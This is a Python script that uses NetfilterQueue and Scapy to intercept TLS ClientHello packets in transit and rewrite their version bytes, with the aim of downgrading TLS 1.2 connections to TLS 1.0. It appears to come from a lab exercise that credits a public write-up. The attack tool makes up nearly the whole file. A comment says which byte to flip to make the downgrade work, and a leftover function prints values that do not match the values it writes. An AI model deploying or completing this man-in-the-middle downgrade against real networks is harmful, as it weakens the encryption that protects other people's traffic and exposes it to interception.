#!/usr/bin/python
#
# With many thanks to Ludovic Barman for their great write-up.
# https://lbarman.ch/blog/downgrade-tls/
#
# Also, thanks to Mike D. for teaching me how to join() to fix
# the bytes for set_payload().
#
# Also, @XargsNotBombs makes the wonderful Illustrated TLS Connections site.
# https://tls.ulfheim.net
#

from netfilterqueue import NetfilterQueue
from scapy import *
from scapy.layers.tls import *

scapy_builtins = __import__('scapy.all', globals(), locals(),'.').__dict__
__builtins__.__dict__.update(scapy_builtins)

nfQueueID         = 0
maxPacketsToStore = 100



def processPacket(packet):
  print("...")
  scapy_packet = IP(packet.get_payload())

  if not scapy_packet.haslayer("Raw"):
    packet.accept();

  else:
    tcpPayload = scapy_packet["Raw"].load

    if tcpPayload[0] == '\x16' and tcpPayload[1] == '\x03' and tcpPayload[5] == '\x01':
      print("TLS handshake found, client HELLO.")

      if tcpPayload[9] == '\x03' and tcpPayload[10] == '\x03':
        print("TLS v1.2, dropping down to v1.0")
        print(scapy_packet.command())

        scapy_packet = craftTLS(scapy_packet)
        packet.set_payload(bytes(scapy_packet))

        print("After re-creating it:")
        print(scapy_packet.command())

      packet.accept()   
    
    else:                                                                              
      packet.accept();


def craftTLS(scapy_packet):  
  IP_src = scapy_packet["IP"].src
  IP_dst = scapy_packet["IP"].dst

  IP_frag = scapy_packet["IP"].frag
  IP_proto = scapy_packet["IP"].proto
  IP_tos = scapy_packet["IP"].tos
  IP_id = scapy_packet["IP"].id
  IP_version = scapy_packet["IP"].version
  IP_flags = scapy_packet["IP"].flags
  IP_ihl = scapy_packet["IP"].ihl
  IP_ttl = scapy_packet["IP"].ttl

  TCP_sport = scapy_packet["TCP"].sport
  TCP_dport = scapy_packet["TCP"].dport
  TCP_options = scapy_packet["TCP"].options
  
  TCP_reserved = scapy_packet["TCP"].reserved
  TCP_seq = scapy_packet["TCP"].seq
  TCP_ack = scapy_packet["TCP"].ack    
  TCP_flags = scapy_packet["TCP"].flags
  
  ip=IP(frag=IP_frag, src=IP_src, proto=IP_proto, tos=IP_tos, dst=IP_dst, id=IP_id, version=IP_version, flags=IP_flags, ttl=IP_ttl, ihl=IP_ihl)
  tcp=TCP(reserved=TCP_reserved, seq=TCP_seq, ack=TCP_ack, flags=TCP_flags, dport=TCP_dport, sport=TCP_sport, options=TCP_options )  
  
  # I can't use the modern Scapy TLS crafting tools, due to how we build this container.
  # The py-cryptography package is too old and I can't simply "pip install" it. 
  #TLS_payload = TLSClientHello(version=???)
  
  RAW_load = scapy_packet["Raw"].load
  
  RAW_bytes = [b for b in RAW_load]                                                              
  RAW_bytes[9] = '\x03'                                                                          
  RAW_bytes[10] = '\x03'           # Flip this to \x01 for a downgrade
  RAW_load = b''.join(RAW_bytes) 
  
  packet = ip/tcp/RAW_load
  return packet



def downgradeTLS(scapy_packet):
  del scapy_packet["IP"].chksum
  del scapy_packet["TCP"].chksum

  rawBytes = [b for b in scapy_packet]
  print("Position [61][62] was: ", rawBytes[61], rawBytes[62], ". Needs to change to 0x03 0x01.")

  rawBytes[61] = '\x03'
  rawBytes[62] = '\x03'

  print("Position [61][62] is now: ", rawBytes[61], rawBytes[62], ".")
  
  scapy_packet = b''.join(rawBytes)
  return scapy_packet



print("Binding to NFQUEUE", nfQueueID)
nfqueue = NetfilterQueue()
nfqueue.bind(nfQueueID, processPacket, maxPacketsToStore)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print('Listener killed.')

nfqueue.unbind()

